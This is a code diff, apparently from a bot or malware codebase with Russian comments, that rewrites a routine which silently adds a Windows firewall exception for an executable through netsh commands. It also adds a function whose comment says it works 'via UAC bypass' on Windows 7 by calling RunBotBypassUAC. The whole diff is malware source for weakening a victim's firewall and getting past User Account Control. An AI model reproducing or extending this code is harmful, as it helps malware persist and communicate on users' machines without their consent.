@@ -990,19 +990,48 @@ bool AddAllowedprogram( const char* pathExe )
 	pSetCurrentDirectoryA(systemDir);
 
 	//по версии windows выбираем формат команды
-	char* cmd = (char*)HEAP::Alloc(512);
+	char* cmdAdd = (char*)HEAP::Alloc(512);
+	char* cmdDel = (char*)HEAP::Alloc(512);
+
 	fwsprintfA pwsprintfA = Get_wsprintfA();
     OSVERSIONINFOA ver;
     ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
     pGetVersionExA(&ver);
-	const char* format =  ver.dwMajorVersion >= 6 ? NetshFirewallWin7 : NetshFirewallWinXp;
-	pwsprintfA( cmd, GetStr(format).t_str(), pathExe, name );
+	if( ver.dwMajorVersion >= 6 )
+	{
+		pwsprintfA( cmdDel, GetStr(NetshFirewallWin7Del).t_str(), name );
+		pwsprintfA( cmdAdd, GetStr(NetshFirewallWin7Add).t_str(), name, pathExe );
+	}
+	else
+	{
+		cmdDel[0] = 0;
+		pwsprintfA( cmdAdd, GetStr(NetshFirewallWinXp).t_str(), pathExe, name );
+	}
 	
-	VDRDBG( "Video", "%s", cmd );
-	bool ret = RunFileA( cmd, true, true );
+	VDRDBG( "Video", "Del: %s", cmdDel );
+	VDRDBG( "Video", "Add: %s", cmdAdd );
+	if( cmdDel[0] )
+		RunFileA( cmdDel, true, true );
+	bool ret = RunFileA( cmdAdd, true, true );
 
-	HEAP::Free(cmd);
+	HEAP::Free(cmdAdd);
+	HEAP::Free(cmdDel);
 	pSetCurrentDirectoryA(currDir);
 	
 	return ret;
+}
+
+bool AddAllowedprogramUAC( const char* pathExe )
+{
+    OSVERSIONINFOA ver;
+    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
+	pGetVersionExA(&ver);
+	if( ver.dwMajorVersion < 6 ) 
+		return AddAllowedprogram(pathExe);
+	else //для 7-ки делаем через обход уака
+	{
+		bool res = RunBotBypassUAC( 0, UAC_CMD_AddAllowed, pathExe );
+		if( res ) pSleep(10000); //ждем пока выполнится команда
+		return res;
+	}
 }
